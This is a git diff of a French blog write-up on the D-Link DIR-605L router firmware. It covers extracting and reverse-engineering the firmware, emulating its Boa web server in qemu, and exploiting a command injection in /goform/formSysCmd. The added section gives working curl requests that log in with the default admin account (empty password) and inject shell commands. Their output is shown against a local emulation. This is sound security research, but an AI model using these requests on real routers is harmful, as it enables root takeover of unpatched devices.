@@ -1,12 +1,12 @@
 ---
-title: "Analyse d'une RCE DLink DIR605L"
+title: "Analyse et Emulation d'une RCE DLink DIR605L"
 date: 2026-05-21 12:00:00 +0200
 categories: [IoT Exploitation MIPS]
 tags: [pwn, IoT, exploit]
 ---
 #### 1. Introduction
 
-Ce projet consiste en la documentation du processus d'analyse d'un firmware, l'extraction de son système de fichiers ainsi qu'à l'identification d'une vulnérabilité RCE par injection de commande via reverse engineering.
+Ce projet consiste en la documentation du processus d'analyse d'un firmware, l'extraction de son système de fichiers ainsi qu'à l'identification d'une vulnérabilité RCE par injection de commande via reverse engineering puis enfin à son exploitation grâce à l'émulation.
 
 Nous allons ainsi nous servir du firmware d'un routeur grand public : le D-Link DIR-605L (Firmware v1.13).
 
@@ -20,7 +20,7 @@ Une injection de commande devient alors possible si l'entrée n'est pas nettoyé
 
 #### 3. Extraction du firmware et analyse de la structure
 
-Avant toute analyse du binaire du serveur web, il faut tout d'abord l'extraire de l'image globale du firmware (.bin). Pour se faire, nous utilisons donc un outil connu et simple d'utilisation appelé **Binwalk**. Cet outil permet l'extraction de données basée sur les signatures et les headers en recherchant les magic numbers.
+Avant toute analyse du binaire du serveur web, il faut tout d'abord l'éxtraire de l'image globale du firmware (.bin). Pour se faire, nous utilisons donc un outil connu et simple d'utilisation appelé **Binwalk**. Cet outil permet l'extraction de données basée sur les signatures et les headers en recherchant les magic numbers.
 
 `binwalk -eM dir605L_FW_113.bin`
 
@@ -40,9 +40,9 @@ Une fois l'outil installé nous pouvons donc relancer la commande binwalk qui ne
 
 Nous allons maintenant nous intéresser au système de fichiers, ici **squashfs-root-0**
 
-![1779366798319](assets/images/2026-05-21-RCE-TPLink-Patched/1779366798319.png)
+![1779366798319](image/2026-05-21-RCE-TPLink-Patched/1779366798319.png)
 
-En se servant de la commande **tree** nous pouvons apercevoir dans la partie dossier `web/ ` un dossier appelé `mydlink/ ` contenant différents fichiers au format `.asp`, les fichiers possédant cette extension sont des fichiers Active Server Page, ce sont des documents web qui peuvent contenir des codes HTML, textes, graphiques et XML, ainsi ces fichiers serveur ne possèdent aucun code classique mais une directive côté serveur. Le vrai code de ces fichiers est donc compilé à l'intérieur du binaire du serveur web.
+En se servant de la commande **tree** nous pouvons apercevoir dans la partie dossier ` web/` un dossier appelé `mydlink/` contenant différents fichiers au format `.asp`, les fichiers possédant cette extension sont des fichiers Active Server Page, ce sont des documents web qui peuvent contenir des codes HTML, textes, graphiques et XML, ainsi ces fichiers serveur ne possèdent aucun code classique mais une directive côté serveur. Le vrai code de ces fichiers est donc compilé à l'intérieur du binaire du serveur web.
 
 Le contenu du fichier `set_admin.asp` pour simple exemple est un simple formulaire HTML, qui envoie ses donnéesà une URL spécifique : `/goform/form_admin` :
 
@@ -68,11 +68,11 @@ En déroulant les différents binaires présents nous tombons directement sur le
 
 Boa est un serveur web open source très léger, beaucoup utilisé dans les routeurs au début des années 2000-2010. Les constructeurs y ajoutaient en général des modifications pour supporter les scrtips ASP et les formulaires, créeant ainsi des failles d'exploitation.
 
-![1779367785072](assets/images/2026-05-21-RCE-TPLink-Patched/1779367785072.png)
+![1779367785072](image/2026-05-21-RCE-TPLink-Patched/1779367785072.png)
 
 Nous pouvons aussi noter la présence de `boa-dog.sh`, qui est un script **"Watchdog"** chargé de surveiller le processus `boa` et de le relancer s'il plante.
 
-Comme attendu le firmware du routeur se sert d'une architecture MIPS 32-bits, la particularité des architectures MIPS est l'endianness différente. En effet la grande majorité des architectures telles que x86_64, x86, ARM ou encore RISC-V utilisent le little endian, c'est-à-dire que la lecture des bits se fait du bits de poids faible vers le bit de poids fort (ex :` ici l'adresse 0xcafebabe se lira : 0xbe, 0xba, 0xfe, 0xca`)
+Comme attendu le firmware du routeur se sert d'une architecture MIPS 32-bits, la particularité des architectures MIPS est l'endianness différente. En effet la grande majorité des architectures telles que x86_64, x86, ARM ou encore RISC-V sont en little endian, c'est-à-dire que la lecture des bits se fait du bits de poids faible vers le bit de poids fort (ex :` ici l'adresse 0xcafebabe se lira : 0xbe, 0xba, 0xfe, 0xca`)
 
 L'architecture MIPS est donc différente, elle est en big endian, ainsi les bits sont lus du bit de poids fort vers le bit de poids faible, il est possible d'obtenir quelques informations sur le binaire en se servant de la commande native **file** :
 
@@ -86,7 +86,7 @@ Nous allons donc nous servir de l'outil Ghidra qui permet de désassembler le co
 
 Grâce aux informations récupérées précédemment via la commande **file** nous pouvons donc ouvrir le binaire avec Ghidra en y rentrant les bonnes informations :
 
-![1779368536195](assets/images/2026-05-21-RCE-TPLink-Patched/1779368536195.png)
+![1779368536195](image/2026-05-21-RCE-TPLink-Patched/1779368536195.png)
 
 Nous choisissons donc ici comme langage : MIPS 32 - bits utilisant le format MSB par défaut.
 
@@ -433,6 +433,8 @@ void websAspInit(void)
 
 
 ```
+
+*L'image ne monte pas toutes les fonctions présentes
 
 La fonction websAspInit() est donc le tableau de bord du serveur web, elle fait le lien entre les requêtes HTTP de l'utilisateur et les fonctions compilées du routeur.
 
@@ -801,7 +803,7 @@ Cela signifie ainsi qu'un attaquant n'a meme pas besoin de chercher une méthode
 
 Nous pouvons tout de même observer que le script JavaSript `saveClick()` tente de forcer l'utilisateur à ajouter l'argument -c s'il tape la commande ping (afin d'éviter que le routeur ne boucle indéfiniment sur un ping infini et ne plante). Cependant, cette validation se fait du côté navigateur, un attaquant envoyant sa requête directement via **curl** ou **Python** outrepassera totalement cette restriction.
 
-##### 5.1. Synthèse
+##### 5.1. Synthèse théorique
 
 Le firmware de ce routeur possède ainsi plusieurs vulnérabilités. Un attaquant distant ou local peut :
 
@@ -812,3 +814,161 @@ Le firmware de ce routeur possède ainsi plusieurs vulnérabilités. Un attaquan
 Une RCE est donc ici possible, le code étant exécuté avec les permissions root sur le système, un attaquant peut très bien initialiser un reverse shell afin de se connecter directement au routeur avec les privilèges root. Cette connexion au routeur dans le cadre d'un réseau d'entreprise peut entraîner un pivotement vers de plus importantes machines.
 
 L'analyse de ce firmware permet ainsi de démontrer les failles de sécurité sur les anciens équipements connectés, il est ainsi primordial de rappeler de mettre à jour ses équipements régulièrement. Ce firmware étant très ancien, de nombreux firmwares corrigeant les différentes vulnérabilités ont été mis en production, cette analyse servant ainsi de prévention et de démonstration.
+
+#### 6. Emulation du serveur web
+
+Nous allons donc maintenant émuler le serveur web `boa` afin de pouvoir recréer et tester les failles théoriques que nous avons trouvé. Afin d'émuler le serveur web nous devons prendre en compte quelques paramètres fondamentaux :
+
+* Le binaire utilise l'architecture MIPS 32-bits en MSB.
+* Le binaire appelle la librairie `libapmib.so` ainsi qu'une `MIB` afin de récupérer les informations des connexions utilisateur.
+* Le binaire appels des matériels physiques et non virtuels
+
+Ainsi il va falloir émuler l'architecture MIPS 32-bits MSB, recréer une nouvelle MIB afin d'éviter toute erreur de librairie avec le serveur web boa puis nous devrons monter les différents repértoires ainsi qu'en recréer afin d'émuler les matériels physiques.
+
+La première étape est donc de monter le répertoire `/proc` car le binaire a besoin de voir les structures dynamiques du noyau :
+
+`mount -t proc /proc ./proc`
+
+Nous allons ensuite utiliser le binaire intégré dans le firmware appelé `flash`, c'est un utilitaire Realtek chargé d'initialiser la MIB, nous l'utiliserons donc pour recréer une MIB, il est important de se servir de l'outil `strace` permettant de déboguer les intéractions entre un programme et le noyau :
+
+`strace -f -e trace=open,openat chroot . ./bin/qemu-mips-static ./bin/flash default 2>&1 | grep -E 'ENOENT|var|tmp|flash'`
+
+Grâce à `strace`, nous tombons sur une erreur assez simple à résoudre qui nous empêche d'exécuter le binaire `flash` :
+
+`[pid  1091] openat(AT_FDCWD, "/dev/mtd", O_RDWR) = -1 ENOENT (No such file or directory)`
+
+Le fichier `/dev/mtd` n'existe pas dans le système de fichiers que nous avons extrait. En effet ce fichier est un périphérique de stockage physique de la mémoire flash du routeur, ainsi nous allons créer un fichier brut `mtd` rempli de zéros d'une taille de 512Ko afin d'avoir assez de place :
+
+`mkdir -p dev `
+`dd if=/dev/zero of./dev/mtd_raw bs=1k count=512 `
+`ln -s mtd_raw ./dev/mtd `
+`chmod 777 ./dev/mtd ./dev/mtd_raw`
+
+Nous allons ensuite remonter le repértoire  `/proc` afin d'être sur qu'il fonctionne :
+
+`mount -t proc /proc ./proc 2>/dev/null`
+
+Puis nous allons maintenant exécuter le binaire `flash` avec `qemu-mips-static` afin d'initialiser notre MIB :
+
+`chroot . ./bin/qemu-mips-static ./bin/flash default`
+
+`len= 28172 header.len=28171 end`
+
+Notre MIB est désormais officiellement créée et initialisée à l'intérieur du fichier `/dev/mtd`, nous n'aurons ainsi aucun problème avec la librairie `libapmib.so`.
+
+Nous allons maintenant lancer le serveur web `boa` toujours avec `qemu-mips-static` :
+
+`chroot . ./bin/qemu-mips-static ./bin/boa -c /etc/boa`
+
+Le serveur web boa attend en paramètre le dossier parent de celui-ci.
+
+`DevInfo.txt text mode! hard ver is96C8 boa: server version Boa/0.94.14rc21 boa: server built May 25 2012 at 13:03:21. boa: starting server pid=2369, port 80`
+
+Notre serveur s'est donc bien initialisé et son site internet se trouve à : `0.0.0.0:80` soit `localhost:80`
+
+![1779649652296](assets/images/2026-05-21-RCE-TPLink-Patched/1779649652296.png)
+
+Malheureusement lorsque nous voulons configurer le site web, celui-ci plante avec l'erreur :
+
+`qemu: uncaught target signal 10 (Bus error) - core dumped (SIGSEGV)`
+
+Cette erreur se passe lors de la transmission des informations à la librairie `libapmib.so`. Lorsque nous validons le choix de la langue ainsi que le mode de configuration manuel ou automatique, le binaire `boa` essaie de modifier la configuration réseau.
+
+Puisque le binaire crash lors de la configuration initiale du Wizard de la MIB, nous allons modifier le fichier effectuant la redirection afin de rediriger le tout vers la page d'accueil du site sautant ainsi la configuration initiale, mais tout d'abord nous devons trouver quel fichier contient la règle de redirection nous redirigeant de force vers le fichier Wizard :
+
+`grep -rn "Wizard_Easy_LangSelect" web/ web/first.asp:17:                       self.location.href="Basic/Wizard_Easy_LangSelect.asp";`
+
+Le fichier se nomme donc `first.asp`, nous allons donc modifier ce fichier afin de nous envoyer directement sur la page d'accueil du site à la place. Cela peut se faire via un éditeur texte comme vim ou encore nano :
+
+```
+﻿<html>
+<head>
+</head>
+<% getLangInfo("LangPathWizard");%>
+<script>
+function init()
+{
+        var ecflag = <% getIndexInfo("enableecflag") %>;
+        if(ecflag == 0)
+        {
+                if((LangCode == "SC")||(LangCode == "TW"))
+                {
+                        self.location.href="Basic/Wizard_Easy_Welcome.asp";
+                }
+                else
+                {
+                        self.location.href="Basic/Wizard_Easy_LangSelect.asp";
+                }
+        }
+        else
+        {
+                self.location.href="index.asp";
+        }
+}
+</script>
+<body onLoad="init();">
+</html>
+```
+
+Le fichier `first.asp` est enfaite une condition plutôt simple : Si la variable ecflag est égale à 1, le routeur saute complètement les assistants de configuration et nous envoie sur `index.asp`, sinon nous nous retrouvons dans la configuration du Wizard.
+
+Afin d'éviter tout problème ultérieur, nous n'allons pas modifier le fichier `first.asp` afin d'y ajouter une ligne :
+
+`ecflag = 1;`
+
+Nous allons plutôt modifier la MIB via le binaire `flash` afin d'initialiser par défaut ecflag à 1, nous pouvons modifier ce flag comme ceci :
+
+`chroot . ./bin/qemu-mips-static ./bin/flash set ENABLE_ECFLAG 1`
+
+Une fois le serveur relancé nous tombons bien sur la page `index.asp` en premier.
+
+![1779651571907](assets/images/2026-05-21-RCE-TPLink-Patched/1779651571907.png)
+
+#### 7. Exploitation de l'injection de commande
+
+Nous allons donc maintenant exploiter l'injection de commande que nous avons découvert dans le code de la fonction `formSysCmd`, plus précisément la concaténation des chaînes sans vérification :
+
+`curl -i -X POST 'http://127.0.0.1/goform/formSysCmd'   --data-urlencode 'sysCmd=echo RCE_OK'   --data-urlencode 'submit-url=/shell.asp'`
+
+`HTTP/1.0 302 Redirect Date: Sun, 24 May 2026 20:50:06 GMT Server: Boa/0.94.14rc21 Accept-Ranges: bytes Connection: close Content-Type: text/html Location: /shell.asp`
+
+`<html><head></head><body>This document has moved to a new <a href="http://(null)/shell.asp">location</a>.Please update your documents to reflect the new location.                 </body></html>`
+
+Nous tombons sur une erreur assez originale, la réponse curl a tenté de nous rediriger vers la page `index.html` afin de forcer l'authentification, ainsi malgré l'absence de besoin de connection que nous avons vu dans les fonctions du binaire boa, une authentification est quand même nécessaire.
+
+Nous avons initialisé la MIB par défaut avec la commande `flash default`, ainsi nous connaissons déjà une paire `user / password` : celle de l'utilisateur admin :
+
+* user = admin
+* password = vide
+
+ainsi nous avons :
+
+`login_n=admin login_pass=` (vide)
+
+Nous allons donc effectuer une première requete POST en nous connectant via ces informations :
+
+`curl -i -c /tmp/dlink.cookies -b /tmp/dlink.cookies   -X POST 'http://127.0.0.1/goform/formLogin' --data-urlencode 'login_n=admin'   --data-urlencode 'login_pass='   --data-urlencode 'curTime=123456789'   --data-urlencode 'FILECODE='   --data-urlencode 'VERIFICATION_CODE='`
+
+Puis effectuer une deuxième requête curl qui effectuera un echo avec la chaîne "RCE_OK", si l'injection de commande fonctionne alors la chaîne "RCE_OK" s'affichera dans le fichier syscmd.log qui sera créé dans `tmp/` :
+
+`curl -i -c /tmp/dlink.cookies -b /tmp/dlink.cookies \   -X POST 'http://127.0.0.1/goform/formSysCmd' \   --data-urlencode 'sysCmd=echo RCE_OK' \   --data-urlencode 'submit-url=/shell.asp'`
+
+`HTTP/1.0 302 Redirect Date: Sun, 24 May 2026 20:57:44 GMT Server: Boa/0.94.14rc21 Accept-Ranges: bytes Connection: close Content-Type: text/html Location: /shell.asp`
+
+`<html><head></head><body>This document has moved to a new <a href="http://(null)/shell.asp">location</a>.Please update your documents to reflect the new location.                 </body></html>`
+
+Cette fois-ci, malgré la demande de redirection, nous avons bien un fichier `tmp/syscmd.log` qui s'est créé :
+
+`ls tmp/  binfmt.log  boot_ver  chklst.txt  DevInfo.txt  fw_ver  manual.log  syscmd.log  version.txt`
+
+`cat tmp/syscmd.log  RCE_OK`
+
+Nous pouvons aussi modifier la commande afin de récupérer des informations sur le noyau :
+
+`curl -i -c /tmp/dlink.cookies -b /tmp/dlink.cookies \   -X POST 'http://127.0.0.1/goform/formSysCmd' \   --data-urlencode 'sysCmd=sh -c "{ uname -a; cat /proc/version; } 2>&1"' \   --data-urlencode 'submit-url=/shell.asp'`
+
+Ainsi le fichier tmp/syscmd.log contient maintenant :
+
+`Linux version 6.6.114.1-microsoft-standard-WSL2 (root@507f3e43091d) (gcc (GCC) 13.2.0, GNU ld (GNU Binutils) 2.41) #1 SMP PREEMPT_DYNAMIC Mon Dec  1 20:46:23 UTC 2025` (Ici ce sont les informations de mon environnement émulant le serveur)
+
+L'injection de commande théorique que nous avons trouvé en effectuant une rétro-ingénierie du serveur web boa du firmware est donc bien exploitable.
